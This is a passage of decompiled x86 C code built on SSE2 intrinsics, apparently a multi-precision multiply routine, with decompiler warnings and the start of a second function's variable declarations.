  __m128i v260; // [esp+60h] [ebp-13Ch] BYREF
  __m128i v261; // [esp+70h] [ebp-12Ch] BYREF
  __m128i v262; // [esp+80h] [ebp-11Ch] BYREF
  __m128i v263; // [esp+90h] [ebp-10Ch]
  __m128i v264[7]; // [esp+A0h] [ebp-FCh]
  __m128i v265; // [esp+110h] [ebp-8Ch] BYREF
  __m128i v266; // [esp+120h] [ebp-7Ch] BYREF
  __m128i v267; // [esp+130h] [ebp-6Ch] BYREF
  __m128i v268; // [esp+140h] [ebp-5Ch] BYREF
  __m128i v269; // [esp+150h] [ebp-4Ch] BYREF
  __m128i v270; // [esp+160h] [ebp-3Ch] BYREF
  __m128i v271; // [esp+170h] [ebp-2Ch] BYREF
  __m128i v272; // [esp+180h] [ebp-1Ch] BYREF

  for ( i = 0; i != 64; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v255 + 2 * i) = v4;
    *(__m128i *)((char *)&v256 + 2 * i) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v263 + 2 * i) = v5;
    v264[i / 8] = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v265 + 2 * i) = v6;
    *(__m128i *)((char *)&v266 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v265);
  v8 = _mm_mul_epu32(_mm_load_si128(&v255), v7);
  si128 = _mm_load_si128(&stru_4BACE0);
  v10 = _mm_and_si128(si128, v8);
  v11 = _mm_mul_epu32(v7, v263);
  v12 = _mm_and_si128(si128, v11);
  v13 = _mm_srli_epi32(v11, 0x10u);
  v14 = _mm_move_epi64(v12);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_add_epi32(v10, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  v17 = _mm_add_epi32(_mm_srli_epi32(v8, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v16);
  v18 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v16), 0x10u), _mm_move_epi64(v17));
  v19 = _mm_unpackhi_epi64(v17, v14);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v20 = _mm_add_epi32(_mm_unpackhi_epi64(v16, v14), _mm_srli_epi64(v18, 0x30u));
  v21 = _mm_load_si128(&v265);
  v22 = _mm_mul_epu32(_mm_load_si128(&v256), v21);
  v23 = _mm_mul_epu32(v21, v264[0]);
  v24 = _mm_load_si128(&stru_4BACE0);
  v25 = _mm_add_epi32(v20, _mm_and_si128(v24, v22));
  v26 = _mm_add_epi32(v19, _mm_srli_epi32(v22, 0x10u));
  v27 = _mm_and_si128(v24, v23);
  v28 = _mm_srli_epi32(v23, 0x10u);
  sub_444F1B((int)&v256, &v265);
  v29 = _mm_move_epi64(v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_add_epi32(v25, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v29), v29), 4));
  v32 = _mm_add_epi32(v26, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  *(_DWORD *)(v33 + 8) = _mm_cvtsi128_si32(v31);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v31), 0x10u), _mm_move_epi64(v32));
  v35 = _mm_unpackhi_epi64(v32, v29);
  *(_QWORD *)(v33 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v31, v29), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v266);
  v38 = _mm_mul_epu32(_mm_load_si128(&v256), v37);
  v40 = _mm_mul_epu32(v37, *v39);
  v41 = _mm_load_si128(&stru_4BACE0);
  v42 = _mm_add_epi32(v36, _mm_and_si128(v41, v38));
  v43 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v44 = _mm_and_si128(v41, v40);
  v45 = _mm_srli_epi32(v40, 0x10u);
  sub_444EDE();
  v46 = _mm_move_epi64(v44);
  v47 = _mm_move_epi64(v45);
  v48 = _mm_add_epi32(v42, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v46), v46), 4));
  v49 = _mm_add_epi32(v43, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v45, v47), v47), 4));
  *(_DWORD *)(v50 + 16) = _mm_cvtsi128_si32(v48);
  v51 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v48), 0x10u), _mm_move_epi64(v49));
  v52 = _mm_unpackhi_epi64(v49, v46);
  *(_QWORD *)(v50 + 18) = v51.m128i_i64[0];
  v53 = _mm_add_epi32(_mm_unpackhi_epi64(v48, v46), _mm_srli_epi64(v51, 0x30u));
  v55 = _mm_load_si128(&v266);
  v56 = _mm_mul_epu32(_mm_load_si128(&v257), v55);
  v57 = _mm_mul_epu32(v55, v54[1]);
  v58 = _mm_load_si128(&stru_4BACE0);
  v59 = _mm_add_epi32(v53, _mm_and_si128(v58, v56));
  v60 = _mm_add_epi32(v52, _mm_srli_epi32(v56, 0x10u));
  v61 = _mm_and_si128(v58, v57);
  v62 = _mm_srli_epi32(v57, 0x10u);
  sub_444EA1();
  v63 = _mm_move_epi64(v61);
  v64 = _mm_move_epi64(v62);
  v65 = _mm_add_epi32(v59, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v61, v63), v63), 4));
  v66 = _mm_add_epi32(v60, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v62, v64), v64), 4));
  *(_DWORD *)(v67 + 24) = _mm_cvtsi128_si32(v65);
  v68 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v65), 0x10u), _mm_move_epi64(v66));
  v69 = _mm_unpackhi_epi64(v66, v63);
  *(_QWORD *)(v67 + 26) = v68.m128i_i64[0];
  v70 = _mm_add_epi32(_mm_unpackhi_epi64(v65, v63), _mm_srli_epi64(v68, 0x30u));
  v71 = _mm_load_si128(&v267);
  v72 = _mm_mul_epu32(_mm_load_si128(&v257), v71);
  v74 = _mm_mul_epu32(v71, *v73);
  v75 = _mm_load_si128(&stru_4BACE0);
  v76 = _mm_add_epi32(v70, _mm_and_si128(v75, v72));
  v77 = _mm_add_epi32(v69, _mm_srli_epi32(v72, 0x10u));
  v78 = _mm_and_si128(v75, v74);
  v79 = _mm_srli_epi32(v74, 0x10u);
  sub_444E64();
  v80 = _mm_move_epi64(v78);
  v81 = _mm_move_epi64(v79);
  v82 = _mm_add_epi32(v76, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v78, v80), v80), 4));
  v83 = _mm_add_epi32(v77, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v79, v81), v81), 4));
  *(_DWORD *)(v84 + 32) = _mm_cvtsi128_si32(v82);
  v85 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v82), 0x10u), _mm_move_epi64(v83));
  v86 = _mm_unpackhi_epi64(v83, v80);
  *(_QWORD *)(v84 + 34) = v85.m128i_i64[0];
  v87 = _mm_add_epi32(_mm_unpackhi_epi64(v82, v80), _mm_srli_epi64(v85, 0x30u));
  v89 = _mm_load_si128(&v267);
  v90 = _mm_mul_epu32(_mm_load_si128(&v258), v89);
  v91 = _mm_mul_epu32(v89, v88[1]);
  v92 = _mm_load_si128(&stru_4BACE0);
  v93 = _mm_add_epi32(v87, _mm_and_si128(v92, v90));
  v94 = _mm_add_epi32(v86, _mm_srli_epi32(v90, 0x10u));
  v95 = _mm_and_si128(v92, v91);
  v96 = _mm_srli_epi32(v91, 0x10u);
  sub_444E27();
  v97 = _mm_move_epi64(v95);
  v98 = _mm_move_epi64(v96);
  v99 = _mm_add_epi32(v93, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v95, v97), v97), 4));
  v100 = _mm_add_epi32(v94, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v96, v98), v98), 4));
  *(_DWORD *)(v101 + 40) = _mm_cvtsi128_si32(v99);
  v102 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v99), 0x10u), _mm_move_epi64(v100));
  v103 = _mm_unpackhi_epi64(v100, v97);
  *(_QWORD *)(v101 + 42) = v102.m128i_i64[0];
  v104 = _mm_add_epi32(_mm_unpackhi_epi64(v99, v97), _mm_srli_epi64(v102, 0x30u));
  v105 = _mm_load_si128(&v268);
  v106 = _mm_mul_epu32(_mm_load_si128(&v258), v105);
  v108 = _mm_mul_epu32(v105, *v107);
  v109 = _mm_load_si128(&stru_4BACE0);
  v110 = _mm_add_epi32(v104, _mm_and_si128(v109, v106));
  v111 = _mm_add_epi32(v103, _mm_srli_epi32(v106, 0x10u));
  v112 = _mm_and_si128(v109, v108);
  v113 = _mm_srli_epi32(v108, 0x10u);
  sub_444DEA();
  v114 = _mm_move_epi64(v112);
  v115 = _mm_move_epi64(v113);
  v116 = _mm_add_epi32(v110, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v112, v114), v114), 4));
  v117 = _mm_add_epi32(v111, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v113, v115), v115), 4));
  *(_DWORD *)(v118 + 48) = _mm_cvtsi128_si32(v116);
  v119 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v116), 0x10u), _mm_move_epi64(v117));
  v120 = _mm_unpackhi_epi64(v117, v114);
  *(_QWORD *)(v118 + 50) = v119.m128i_i64[0];
  v121 = _mm_add_epi32(_mm_unpackhi_epi64(v116, v114), _mm_srli_epi64(v119, 0x30u));
  v123 = _mm_load_si128(&v268);
  v124 = _mm_mul_epu32(_mm_load_si128(&v259), v123);
  v125 = _mm_mul_epu32(v123, v122[1]);
  v126 = _mm_load_si128(&stru_4BACE0);
  v127 = _mm_add_epi32(v121, _mm_and_si128(v126, v124));
  v128 = _mm_add_epi32(v120, _mm_srli_epi32(v124, 0x10u));
  v129 = _mm_and_si128(v126, v125);
  v130 = _mm_srli_epi32(v125, 0x10u);
  sub_444DAD();
  v131 = _mm_move_epi64(v129);
  v132 = _mm_move_epi64(v130);
  v133 = _mm_add_epi32(v127, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v129, v131), v131), 4));
  v134 = _mm_add_epi32(v128, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v130, v132), v132), 4));
  *(_DWORD *)(v135 + 56) = _mm_cvtsi128_si32(v133);
  v136 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v133), 0x10u), _mm_move_epi64(v134));
  v137 = _mm_unpackhi_epi64(v134, v131);
  *(_QWORD *)(v135 + 58) = v136.m128i_i64[0];
  v138 = _mm_add_epi32(_mm_unpackhi_epi64(v133, v131), _mm_srli_epi64(v136, 0x30u));
  v139 = _mm_load_si128(&v269);
  v140 = _mm_mul_epu32(_mm_load_si128(&v259), v139);
  v142 = _mm_mul_epu32(v139, *v141);
  v143 = _mm_load_si128(&stru_4BACE0);
  v144 = _mm_add_epi32(v138, _mm_and_si128(v143, v140));
  v145 = _mm_add_epi32(v137, _mm_srli_epi32(v140, 0x10u));
  v146 = _mm_and_si128(v143, v142);
  v147 = _mm_srli_epi32(v142, 0x10u);
  sub_444DEA();
  v148 = _mm_move_epi64(v146);
  v149 = _mm_move_epi64(v147);
  v150 = _mm_add_epi32(v144, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v146, v148), v148), 4));
  v151 = _mm_add_epi32(v145, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v147, v149), v149), 4));
  *(_DWORD *)(v152 + 64) = _mm_cvtsi128_si32(v150);
  v153 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v150), 0x10u), _mm_move_epi64(v151));
  v154 = _mm_unpackhi_epi64(v151, v148);
  *(_QWORD *)(v152 + 66) = v153.m128i_i64[0];
  v155 = _mm_add_epi32(_mm_unpackhi_epi64(v150, v148), _mm_srli_epi64(v153, 0x30u));
  v157 = _mm_load_si128(&v269);
  v158 = _mm_mul_epu32(_mm_load_si128(&v260), v157);
  v159 = _mm_mul_epu32(v157, v156[1]);
  v160 = _mm_load_si128(&stru_4BACE0);
  v161 = _mm_add_epi32(v155, _mm_and_si128(v160, v158));
  v162 = _mm_add_epi32(v154, _mm_srli_epi32(v158, 0x10u));
  v163 = _mm_and_si128(v160, v159);
  v164 = _mm_srli_epi32(v159, 0x10u);
  sub_444E27();
  v165 = _mm_move_epi64(v163);
  v166 = _mm_move_epi64(v164);
  v167 = _mm_add_epi32(v161, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v163, v165), v165), 4));
  v168 = _mm_add_epi32(v162, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v164, v166), v166), 4));
  *(_DWORD *)(v169 + 72) = _mm_cvtsi128_si32(v167);
  v170 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v167), 0x10u), _mm_move_epi64(v168));
  v171 = _mm_unpackhi_epi64(v168, v165);
  *(_QWORD *)(v169 + 74) = v170.m128i_i64[0];
  v172 = _mm_add_epi32(_mm_unpackhi_epi64(v167, v165), _mm_srli_epi64(v170, 0x30u));
  v173 = _mm_load_si128(&v270);
  v174 = _mm_mul_epu32(_mm_load_si128(&v260), v173);
  v176 = _mm_mul_epu32(v173, *v175);
  v177 = _mm_load_si128(&stru_4BACE0);
  v178 = _mm_add_epi32(v172, _mm_and_si128(v177, v174));
  v179 = _mm_add_epi32(v171, _mm_srli_epi32(v174, 0x10u));
  v180 = _mm_and_si128(v177, v176);
  v181 = _mm_srli_epi32(v176, 0x10u);
  sub_444E64();
  v182 = _mm_move_epi64(v180);
  v183 = _mm_move_epi64(v181);
  v184 = _mm_add_epi32(v178, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v180, v182), v182), 4));
  v185 = _mm_add_epi32(v179, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v181, v183), v183), 4));
  *(_DWORD *)(v186 + 80) = _mm_cvtsi128_si32(v184);
  v187 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v184), 0x10u), _mm_move_epi64(v185));
  v188 = _mm_unpackhi_epi64(v185, v182);
  *(_QWORD *)(v186 + 82) = v187.m128i_i64[0];
  v189 = _mm_add_epi32(_mm_unpackhi_epi64(v184, v182), _mm_srli_epi64(v187, 0x30u));
  v191 = _mm_load_si128(&v270);
  v192 = _mm_mul_epu32(_mm_load_si128(&v261), v191);
  v193 = _mm_mul_epu32(v191, v190[1]);
  v194 = _mm_load_si128(&stru_4BACE0);
  v195 = _mm_add_epi32(v189, _mm_and_si128(v194, v192));
  v196 = _mm_add_epi32(v188, _mm_srli_epi32(v192, 0x10u));
  v197 = _mm_and_si128(v194, v193);
  v198 = _mm_srli_epi32(v193, 0x10u);
  sub_444EA1();
  v199 = _mm_move_epi64(v197);
  v200 = _mm_move_epi64(v198);
  v201 = _mm_add_epi32(v195, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v197, v199), v199), 4));
  v202 = _mm_add_epi32(v196, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v198, v200), v200), 4));
  *(_DWORD *)(v203 + 88) = _mm_cvtsi128_si32(v201);
  v204 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v201), 0x10u), _mm_move_epi64(v202));
  v205 = _mm_unpackhi_epi64(v202, v199);
  *(_QWORD *)(v203 + 90) = v204.m128i_i64[0];
  v206 = _mm_add_epi32(_mm_unpackhi_epi64(v201, v199), _mm_srli_epi64(v204, 0x30u));
  v207 = _mm_load_si128(&v271);
  v208 = _mm_mul_epu32(_mm_load_si128(&v261), v207);
  v210 = _mm_mul_epu32(v207, *v209);
  v211 = _mm_load_si128(&stru_4BACE0);
  v212 = _mm_add_epi32(v206, _mm_and_si128(v211, v208));
  v213 = _mm_add_epi32(v205, _mm_srli_epi32(v208, 0x10u));
  v214 = _mm_and_si128(v211, v210);
  v215 = _mm_srli_epi32(v210, 0x10u);
  sub_444EDE();
  v216 = _mm_move_epi64(v214);
  v217 = _mm_move_epi64(v215);
  v218 = _mm_add_epi32(v212, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v214, v216), v216), 4));
  v219 = _mm_add_epi32(v213, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v215, v217), v217), 4));
  *(_DWORD *)(v220 + 96) = _mm_cvtsi128_si32(v218);
  v221 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v218), 0x10u), _mm_move_epi64(v219));
  v222 = _mm_unpackhi_epi64(v219, v216);
  *(_QWORD *)(v220 + 98) = v221.m128i_i64[0];
  v223 = _mm_add_epi32(_mm_unpackhi_epi64(v218, v216), _mm_srli_epi64(v221, 0x30u));
  v225 = _mm_load_si128(&v271);
  v226 = _mm_mul_epu32(_mm_load_si128(&v262), v225);
  v227 = _mm_mul_epu32(v225, v224[1]);
  v228 = _mm_load_si128(&stru_4BACE0);
  v229 = _mm_add_epi32(v223, _mm_and_si128(v228, v226));
  v230 = _mm_add_epi32(v222, _mm_srli_epi32(v226, 0x10u));
  v231 = _mm_and_si128(v228, v227);
  v232 = _mm_srli_epi32(v227, 0x10u);
  sub_444F1B((int)&v262, &v271);
  v233 = _mm_move_epi64(v231);
  v234 = _mm_move_epi64(v232);
  v235 = _mm_add_epi32(v229, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v231, v233), v233), 4));
  v236 = _mm_add_epi32(v230, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v232, v234), v234), 4));
  *(_DWORD *)(v237 + 104) = _mm_cvtsi128_si32(v235);
  v238 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v235), 0x10u), _mm_move_epi64(v236));
  v239 = _mm_unpackhi_epi64(v236, v233);
  *(_QWORD *)(v237 + 106) = v238.m128i_i64[0];
  v240 = _mm_add_epi32(_mm_unpackhi_epi64(v235, v233), _mm_srli_epi64(v238, 0x30u));
  v241 = _mm_load_si128(&v272);
  v242 = _mm_mul_epu32(_mm_load_si128(&v262), v241);
  v244 = _mm_mul_epu32(v241, *v243);
  v245 = _mm_load_si128(&stru_4BACE0);
  v246 = _mm_and_si128(v245, v242);
  v247 = _mm_add_epi32(v239, _mm_srli_epi32(v242, 0x10u));
  v248 = _mm_and_si128(v245, v244);
  v249 = _mm_srli_epi32(v244, 0x10u);
  v250 = _mm_move_epi64(v248);
  v251 = _mm_move_epi64(v249);
  v252 = _mm_add_epi32(
           _mm_add_epi32(v240, v246),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v248, v250), v250), 4));
  v253 = _mm_add_epi32(v247, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v249, v251), v251), 4));
  *(_DWORD *)(v237 + 112) = _mm_cvtsi128_si32(v252);
  v254 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v252), 0x10u), _mm_move_epi64(v253));
  *(_QWORD *)(v237 + 114) = v254.m128i_i64[0];
  *(_QWORD *)(v237 + 120) = _mm_add_epi64(
                              _mm_add_epi32(_mm_unpackhi_epi64(v252, v250), _mm_srli_epi64(v254, 0x30u)),
                              _mm_slli_epi64(_mm_unpackhi_epi64(v253, v250), 0x10u)).m128i_u64[0];
}
// 44501D: variable 'v33' is possibly undefined
// 445054: variable 'v39' is possibly undefined
// 4450AD: variable 'v50' is possibly undefined
// 4450D4: variable 'v54' is possibly undefined
// 445140: variable 'v67' is possibly undefined
// 445177: variable 'v73' is possibly undefined
// 4451D0: variable 'v84' is possibly undefined
// 4451F7: variable 'v88' is possibly undefined
// 445263: variable 'v101' is possibly undefined
// 44529A: variable 'v107' is possibly undefined
// 4452F3: variable 'v118' is possibly undefined
// 44531A: variable 'v122' is possibly undefined
// 445386: variable 'v135' is possibly undefined
// 4453BD: variable 'v141' is possibly undefined
// 445416: variable 'v152' is possibly undefined
// 44543D: variable 'v156' is possibly undefined
// 4454A9: variable 'v169' is possibly undefined
// 4454E0: variable 'v175' is possibly undefined
// 445539: variable 'v186' is possibly undefined
// 445560: variable 'v190' is possibly undefined
// 4455CC: variable 'v203' is possibly undefined
// 445603: variable 'v209' is possibly undefined
// 44565C: variable 'v220' is possibly undefined
// 445683: variable 'v224' is possibly undefined
// 4456EF: variable 'v237' is possibly undefined
// 445724: variable 'v243' is possibly undefined
// 4BACE0: using guessed type __m128i stru_4BACE0;
// 444CF0: using guessed type __m128i anonymous_11;

//----- (00444DAD) --------------------------------------------------------
int sub_444DAD()
{
  return sub_444DEA();
}
// 444DEA: using guessed type int sub_444DEA(void);

//----- (00444DEA) --------------------------------------------------------
int sub_444DEA()
{
  return sub_444E27();
}
// 444E27: using guessed type int sub_444E27(void);

//----- (00444E27) --------------------------------------------------------
int sub_444E27()
{
  return sub_444E64();
}
// 444E64: using guessed type int sub_444E64(void);

//----- (00444E64) --------------------------------------------------------
int sub_444E64()
{
  return sub_444EA1();
}
// 444EA1: using guessed type int sub_444EA1(void);

//----- (00444EA1) --------------------------------------------------------
int sub_444EA1()
{
  return sub_444EDE();
}
// 444EDE: using guessed type int sub_444EDE(void);

//----- (00444EDE) --------------------------------------------------------
int sub_444EDE()
{
  return sub_444F1B();
}
// 444F1B: using guessed type int sub_444F1B(void);

//----- (00444F1B) --------------------------------------------------------
__m128i __usercall sub_444F1B@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (004457B0) --------------------------------------------------------
void __cdecl sub_4457B0(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm5
  __m128i si128; // xmm6
  __m128i v10; // xmm4
  __m128i v11; // xmm7
  __m128i v12; // xmm6
  __m128i v13; // xmm7
  __m128i v14; // xmm0
  __m128i v15; // xmm1
  __m128i v16; // xmm4
  __m128i v17; // xmm5
  __m128i v18; // xmm6
  __m128i v19; // xmm5
  __m128i v20; // xmm4
  __m128i v21; // xmm7
  __m128i v22; // xmm0
  __m128i v23; // xmm7
  __m128i v24; // xmm6
  __m128i v25; // xmm4
  __m128i v26; // xmm5
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm0
  __m128i v30; // xmm1
  __m128i v31; // xmm4
  __m128i v32; // xmm5
  int v33; // ecx
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i *v39; // edx
  __m128i v40; // xmm7
  __m128i v41; // xmm6
  __m128i v42; // xmm4
  __m128i v43; // xmm5
  __m128i v44; // xmm6
  __m128i v45; // xmm7
  __m128i v46; // xmm0
  __m128i v47; // xmm1
  __m128i v48; // xmm4
  __m128i v49; // xmm5
  int v50; // ecx
  __m128i v51; // xmm6
  __m128i v52; // xmm5
  __m128i v53; // xmm4
  __m128i *v54; // edx
  __m128i v55; // xmm7
  __m128i v56; // xmm0
  __m128i v57; // xmm7
  __m128i v58; // xmm6
  __m128i v59; // xmm4
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm7
  __m128i v63; // xmm0
  __m128i v64; // xmm1
  __m128i v65; // xmm4
  __m128i v66; // xmm5
  int v67; // ecx
  __m128i v68; // xmm6
  __m128i v69; // xmm5
  __m128i v70; // xmm4
  __m128i v71; // xmm7
  __m128i v72; // xmm0
  __m128i *v73; // edx
  __m128i v74; // xmm7
  __m128i v75; // xmm6
  __m128i v76; // xmm4
  __m128i v77; // xmm5
  __m128i v78; // xmm6
  __m128i v79; // xmm7
  __m128i v80; // xmm0
  __m128i v81; // xmm1
  __m128i v82; // xmm4
  __m128i v83; // xmm5
  int v84; // ecx
  __m128i v85; // xmm6
  __m128i v86; // xmm5
  __m128i v87; // xmm4
  __m128i *v88; // edx
  __m128i v89; // xmm7
  __m128i v90; // xmm0
  __m128i v91; // xmm7
  __m128i v92; // xmm6
  __m128i v93; // xmm4
  __m128i v94; // xmm5
  __m128i v95; // xmm6
  __m128i v96; // xmm7
  __m128i v97; // xmm0
  __m128i v98; // xmm1
  __m128i v99; // xmm4
  __m128i v100; // xmm5
  int v101; // ecx
  __m128i v102; // xmm6
  __m128i v103; // xmm5
  __m128i v104; // xmm4
  __m128i v105; // xmm7
  __m128i v106; // xmm0
  __m128i *v107; // edx
  __m128i v108; // xmm7
  __m128i v109; // xmm6
  __m128i v110; // xmm4
  __m128i v111; // xmm5
  __m128i v112; // xmm6
  __m128i v113; // xmm7
  __m128i v114; // xmm0
  __m128i v115; // xmm1
  __m128i v116; // xmm4
  __m128i v117; // xmm5
  int v118; // ecx
  __m128i v119; // xmm6
  __m128i v120; // xmm5
  __m128i v121; // xmm4
  __m128i *v122; // edx
  __m128i v123; // xmm7
  __m128i v124; // xmm0
  __m128i v125; // xmm7
  __m128i v126; // xmm6
  __m128i v127; // xmm4
  __m128i v128; // xmm5
  __m128i v129; // xmm6
  __m128i v130; // xmm7
  __m128i v131; // xmm0
  __m128i v132; // xmm1
  __m128i v133; // xmm4
  __m128i v134; // xmm5
  int v135; // ecx
  __m128i v136; // xmm6
  __m128i v137; // xmm5
  __m128i v138; // xmm4
  __m128i v139; // xmm7
  __m128i v140; // xmm0
  __m128i *v141; // edx
  __m128i v142; // xmm7
  __m128i v143; // xmm6
  __m128i v144; // xmm4
  __m128i v145; // xmm5
  __m128i v146; // xmm6
  __m128i v147; // xmm7
  __m128i v148; // xmm0
  __m128i v149; // xmm1
  __m128i v150; // xmm4
  __m128i v151; // xmm5
  int v152; // ecx
  __m128i v153; // xmm6
  __m128i v154; // xmm5
  __m128i v155; // xmm4
  __m128i *v156; // edx
  __m128i v157; // xmm7
  __m128i v158; // xmm0
  __m128i v159; // xmm7
  __m128i v160; // xmm6
  __m128i v161; // xmm4
  __m128i v162; // xmm5
  __m128i v163; // xmm6
  __m128i v164; // xmm7
  __m128i v165; // xmm0
  __m128i v166; // xmm1
  __m128i v167; // xmm4
  __m128i v168; // xmm5
  int v169; // ecx
  __m128i v170; // xmm6
  __m128i v171; // xmm5
  __m128i v172; // xmm4
  __m128i v173; // xmm7
  __m128i v174; // xmm0
  __m128i *v175; // edx
  __m128i v176; // xmm7
  __m128i v177; // xmm6
  __m128i v178; // xmm4
  __m128i v179; // xmm5
  __m128i v180; // xmm6
  __m128i v181; // xmm7
  __m128i v182; // xmm0
  __m128i v183; // xmm1
  __m128i v184; // xmm4
  __m128i v185; // xmm5
  int v186; // ecx
  __m128i v187; // xmm6
  __m128i v188; // xmm5
  __m128i v189; // xmm4
  __m128i *v190; // edx
  __m128i v191; // xmm7
  __m128i v192; // xmm0
  __m128i v193; // xmm7
  __m128i v194; // xmm6
  __m128i v195; // xmm4
  __m128i v196; // xmm5
  __m128i v197; // xmm6
  __m128i v198; // xmm7
  __m128i v199; // xmm0
  __m128i v200; // xmm1
  __m128i v201; // xmm4
  __m128i v202; // xmm5
  int v203; // ecx
  __m128i v204; // xmm6
  __m128i v205; // xmm5
  __m128i v206; // xmm4
  __m128i v207; // xmm7
  __m128i v208; // xmm0
  __m128i *v209; // edx
  __m128i v210; // xmm7
  __m128i v211; // xmm6
  __m128i v212; // xmm4
  __m128i v213; // xmm5
  __m128i v214; // xmm6
  __m128i v215; // xmm7
  __m128i v216; // xmm0
  __m128i v217; // xmm1
  __m128i v218; // xmm4
  __m128i v219; // xmm5
  int v220; // ecx
  __m128i v221; // xmm6
  __m128i v222; // xmm5
  __m128i v223; // xmm4
  __m128i *v224; // edx
  __m128i v225; // xmm7
  __m128i v226; // xmm0
  __m128i v227; // xmm7
  __m128i v228; // xmm6
  __m128i v229; // xmm4
  __m128i v230; // xmm5
  __m128i v231; // xmm6
  __m128i v232; // xmm7
  __m128i v233; // xmm0
  __m128i v234; // xmm1
  __m128i v235; // xmm4
  __m128i v236; // xmm5
  int v237; // ecx
  __m128i v238; // xmm6
  __m128i v239; // xmm5
  __m128i v240; // xmm4
  __m128i v241; // xmm7
  __m128i v242; // xmm0
  __m128i *v243; // edx
  __m128i v244; // xmm7
  __m128i v245; // xmm6
  __m128i v246; // xmm4
  __m128i v247; // xmm5
  __m128i v248; // xmm6
  __m128i v249; // xmm7
  __m128i v250; // xmm0
  __m128i v251; // xmm1
  __m128i v252; // xmm4
  __m128i v253; // xmm5
  int v254; // ecx
  __m128i v255; // xmm6
  __m128i v256; // xmm5
  __m128i v257; // xmm4
  __m128i *v258; // edx
  __m128i v259; // xmm7
  __m128i v260; // xmm0
  __m128i v261; // xmm7
  __m128i v262; // xmm6
  __m128i v263; // xmm4
  __m128i v264; // xmm5
  __m128i v265; // xmm6
  __m128i v266; // xmm7
  __m128i v267; // xmm0
  __m128i v268; // xmm1
  __m128i v269; // xmm4
  __m128i v270; // xmm5
  int v271; // ecx
  __m128i v272; // xmm6
  __m128i v273; // xmm5
  __m128i v274; // xmm4
  __m128i v275; // xmm7
  __m128i v276; // xmm0
  __m128i *v277; // edx
  __m128i v278; // xmm7
  __m128i v279; // xmm6
  __m128i v280; // xmm4
  __m128i v281; // xmm5
  __m128i v282; // xmm6
  __m128i v283; // xmm7
  __m128i v284; // xmm0
  __m128i v285; // xmm1
